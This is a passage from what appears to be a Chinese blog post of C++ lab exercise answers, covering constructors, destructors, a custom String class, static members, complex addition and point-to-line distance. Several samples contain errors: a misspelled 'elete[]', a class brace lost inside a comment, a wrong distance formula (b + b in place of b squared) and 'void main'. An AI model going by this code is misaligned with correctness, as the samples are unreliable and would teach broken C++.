class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> SID; string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Student</span>(); <span class="built_in">Student</span>(<span class="type">int</span> sid, string name); ~<span class="built_in">Student</span>();</span><br><span class="line">&#125;;</span><br><span class="line">Student::<span class="built_in">Student</span>(<span class="type">int</span> sid, string name) &#123;</span><br><span class="line">    SID = sid; Name = name;</span><br><span class="line">&#125;</span><br><span class="line">Student::<span class="built_in">Student</span>() &#123;</span><br><span class="line">    SID = <span class="number">0</span>; Name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Student::~<span class="built_in">Student</span>() &#123;</span><br><span class="line">    cout &lt;&lt; SID &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; Name &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="function">Student <span class="title">s</span><span class="params">(<span class="number">1002</span>, <span class="string">&quot;；李四&quot;</span>)</span></span>; &#125;</span><br></pre></td></tr></table></figure><h3 id="3-定义一个具有构造函数与析构函数的字符串类-string；">3. 定义一个具有构造函数与析构函数的字符串类 string；</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* str = <span class="literal">NULL</span>);          <span class="comment">//普通构造函数</span></span><br><span class="line">    <span class="built_in">String</span>(<span class="type">const</span> String&amp; other);             <span class="comment">//拷贝构造函数</span></span><br><span class="line">    ~<span class="built_in">String</span>(<span class="type">void</span>);                         <span class="comment">//析构函数</span></span><br><span class="line">    String&amp; <span class="keyword">operator</span>=(<span class="type">const</span> String&amp; other);  <span class="comment">//赋值函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span>* m_String;    <span class="comment">//私有成员，保存字符串&#125;;</span></span><br><span class="line">    String::~<span class="built_in">String</span>(<span class="type">void</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Destructing&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (m_String != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">delete</span>[] m_String;</span><br><span class="line">            m_String = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    String::<span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* str) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Construcing&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            m_String = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];       *m_String = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            m_String = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(str) + <span class="number">1</span>];</span><br><span class="line">            <span class="built_in">strcpy_s</span>(m_String, <span class="built_in">strlen</span>(str) + <span class="number">1</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    String::<span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Constructing Copy&quot;</span> &lt;&lt; endl;</span><br><span class="line">        m_String = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(other.m_String) + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy_s</span>(m_String, <span class="built_in">strlen</span>(other.m_String) + <span class="number">1</span>, other.m_String);</span><br><span class="line">    &#125;</span><br><span class="line">    String&amp; String::<span class="keyword">operator</span>=(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Operate = Function&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line">        elete[] m_String;</span><br><span class="line">        m_String = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(other.m_String) + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy_s</span>(m_String, <span class="built_in">strlen</span>(other.m_String) + <span class="number">1</span>, other.m_String);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="function">String <span class="title">a</span><span class="params">(<span class="string">&quot;hello&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">String <span class="title">b</span><span class="params">(<span class="string">&quot;world&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">String <span class="title">c</span><span class="params">(a)</span></span>;</span><br><span class="line">        c = b;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4-定义一个具有转换构造函数的-item-类，能够实现-int-到-item-的转换。">4. 定义一个具有转换构造函数的 item 类，能够实现 int 到 item 的转换。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">item</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">item</span>() &#123; x = <span class="number">0</span>; y = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="built_in">item</span>(<span class="type">int</span> r) &#123; x = r; y = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="built_in">item</span>(<span class="type">int</span> r, <span class="type">int</span> i) &#123; x = r; y = i; &#125;</span><br><span class="line"><span class="comment">//operator double()&#123;return real;&#125;</span></span><br><span class="line"><span class="keyword">friend</span> item <span class="keyword">operator</span> + (item c1, item c2);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> x; <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">item <span class="keyword">operator</span> + (item c1, item c2) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">item</span>(c1.x + c2.x, c1.y + c2.y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">item::display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">item <span class="title">c1</span><span class="params">(<span class="number">3</span>, <span class="number">4</span>)</span>, <span class="title">c2</span><span class="params">(<span class="number">5</span>, <span class="number">-10</span>)</span>, c3</span>;</span><br><span class="line">c3 = c1 + <span class="number">2.5</span>; c3.<span class="built_in">display</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验五">实验五</h2><h3 id="1-采用静态数据成员和静态成员函数定义一个能够实现对象创建个数跟踪的-person-类；">1. 采用静态数据成员和静态成员函数定义一个能够实现对象创建个数跟踪的 person 类；</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">Person</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">GetCount</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; Person::<span class="built_in">GetCount</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-定义一个复数类-complex，定义一个能够实现两个复数对象相加的全局函数-sum，复数类中的数据成员为私有；">2. 定义一个复数类 complex，定义一个能够实现两个复数对象相加的全局函数 sum，复数类中的数据成员为私有；</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Complex</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        real = <span class="number">0</span>;</span><br><span class="line">        imag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Complex</span>(<span class="type">double</span> r, <span class="type">double</span> i)</span><br><span class="line">    &#123;</span><br><span class="line">        real = r;</span><br><span class="line">        imag = i;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>+(Complex &amp;);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> real;</span><br><span class="line">    <span class="type">double</span> imag;</span><br><span class="line">&#125;;</span><br><span class="line">Complex Complex::<span class="keyword">operator</span>+(Complex &amp;c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Complex</span>(real + c.real, imag + c.imag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//display函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Complex::display</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; real;</span><br><span class="line">    <span class="keyword">if</span> (imag &gt;= <span class="number">0</span>)</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;+&quot;</span>;</span><br><span class="line">    cout &lt;&lt; imag &lt;&lt; <span class="string">&quot;i)&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> x, y, z, h;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入c1,c2(复数相加)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y &gt;&gt; z &gt;&gt; h;</span><br><span class="line">    <span class="function">Complex <span class="title">c1</span><span class="params">(x, y)</span>, <span class="title">c2</span><span class="params">(z, h)</span>, c3</span>;</span><br><span class="line">    c3 = c1 + c2;</span><br><span class="line">    c3.<span class="built_in">display</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-已知点-x-y-到直线-ax-by-c-0-的距离的计算公式为：d-ax-by-c-sqrt-a2-b2-。分别定义一个-point-类和-line-类，利用全局函数-dist-计算一个点到一条直线的距离。">3. 已知点(x, y)到直线 ax+by+c=0 的距离的计算公式为：d = |(ax+by+c)/sqrt(a2+b2)|。分别定义一个 point 类和 line 类，利用全局函数 dist 计算一个点到一条直线的距离。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">point</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">point</span>(<span class="type">int</span> x, <span class="type">int</span> y) &#123; <span class="keyword">this</span>-&gt;x = x; <span class="keyword">this</span>-&gt;y = y; &#125;</span><br><span class="line"><span class="type">int</span> x; <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">line</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">line</span>(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;a = a; <span class="keyword">this</span>-&gt;b = b; <span class="keyword">this</span>-&gt;c = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> a; <span class="type">int</span> b; <span class="type">int</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">dist</span><span class="params">(point&amp; p, line&amp; l)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">abs</span>((l.a * p.x + l.b * p.y + l.c) / <span class="built_in">sqrt</span>(l.a * l.a + l.b + l.b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">point <span class="title">p</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>; <span class="function">line <span class="title">l</span><span class="params">(<span class="number">1</span>, <span class="number">0</span>, <span class="number">-2</span>)</span></span>;</span><br><span class="line">cout &lt;&lt; <span class="built_in">dist</span>(p, l); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-在计算机上练习下面的程序，写出运行结果：">4. 在计算机上练习下面的程序，写出运行结果：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">time</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">time</span>(<span class="type">int</span> hour = <span class="number">24</span>, <span class="type">int</span> minute = <span class="number">0</span>, <span class="type">int</span> second = <span class="number">0</span>)</span><br><span class="line">: _hour(hour), _minute(minute), _second(second) &#123;&#125;</span><br><span class="line"><span class="built_in">time</span>(<span class="type">const</span> time&amp; other)</span><br><span class="line">: _hour(other._hour), _minute(other._minute), _second(other._second) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;STANDARD &quot;</span> &lt;&lt; _hour &lt;&lt; <span class="string">&#x27;:&#x27;</span> &lt;&lt; _minute &lt;&lt; <span class="string">&#x27;:&#x27;</span> &lt;&lt; _second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;CONST  &quot;</span> &lt;&lt; _hour &lt;&lt; <span class="string">&#x27;:&#x27;</span> &lt;&lt; _minute &lt;&lt; <span class="string">&#x27;:&#x27;</span> &lt;&lt; _second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _hour, _minute, _second;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="function">time <span class="title">a</span><span class="params">(<span class="number">12</span>, <span class="number">57</span>, <span class="number">48</span>)</span></span>; a.<span class="built_in">print</span>();</span><br><span class="line"><span class="function"><span class="type">const</span> time <span class="title">b</span><span class="params">(<span class="number">11</span>, <span class="number">34</span>, <span class="number">56</span>)</span></span>; b.<span class="built_in">print</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="实验六">实验六</h2><h3 id="1．补充-string-类的代码，使得-main-函数中的各种操作都能够完成。">1．补充 string 类的代码，使得 main 函数中的各种操作都能够完成。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyString</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyString</span>(); <span class="built_in">MyString</span>(<span class="type">int</span> len); <span class="built_in">MyString</span>(<span class="type">const</span> <span class="type">char</span>* str);</span><br><span class="line"><span class="built_in">MyString</span>(<span class="type">const</span> MyString&amp; another);</span><br><span class="line">MyString&amp; <span class="keyword">operator</span>+=(<span class="type">const</span> <span class="type">char</span>* str);</span><br><span class="line">MyString&amp; <span class="keyword">operator</span>+=(<span class="type">const</span> MyString&amp; s);</span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; cout, MyString&amp; myString);</span><br><span class="line"><span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span> &gt;&gt; (istream&amp; cin, MyString&amp; myString);</span><br><span class="line">MyString&amp; <span class="keyword">operator</span>=(<span class="type">const</span> MyString&amp; another);</span><br><span class="line"><span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">int</span> index);</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>==(MyString&amp; another);</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(MyString&amp; another);</span><br><span class="line">MyString <span class="keyword">operator</span>+(<span class="type">const</span> MyString&amp; myString);</span><br><span class="line">~<span class="built_in">MyString</span>();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length; <span class="type">char</span>* str;</span><br><span class="line">&#125;;</span><br><span class="line">MyString::<span class="built_in">MyString</span>() &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;length = <span class="number">0</span>; <span class="keyword">this</span>-&gt;str = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">int</span> len) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;length = len;</span><br><span class="line"><span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line"><span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;str, <span class="number">0</span>, len);</span><br><span class="line">&#125;</span><br><span class="line">MyString&amp; MyString::<span class="keyword">operator</span>+=(<span class="type">const</span> <span class="type">char</span>* str) &#123;</span><br><span class="line"><span class="type">char</span>* tmp = <span class="keyword">this</span>-&gt;str;</span><br><span class="line">length = <span class="built_in">strlen</span>(<span class="keyword">this</span>-&gt;str) + <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[length + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;str, tmp);</span><br><span class="line"><span class="built_in">strcat</span>(<span class="keyword">this</span>-&gt;str, str);</span><br><span class="line"><span class="keyword">delete</span>[]tmp;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString&amp; MyString::<span class="keyword">operator</span>+=(<span class="type">const</span> MyString&amp; s) &#123;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + s.str; <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">const</span> <span class="type">char</span>* str) &#123;</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;length = <span class="number">0</span>; <span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;str, <span class="string">&quot;&quot;</span>); <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>-&gt;length = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[<span class="keyword">this</span>-&gt;length + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;str, str);</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">const</span> MyString&amp; another) &#123;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;拷贝构造函数 MyString::MyString(const MyString &amp; another)....&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">this</span>-&gt;length = another.length;</span><br><span class="line"><span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[<span 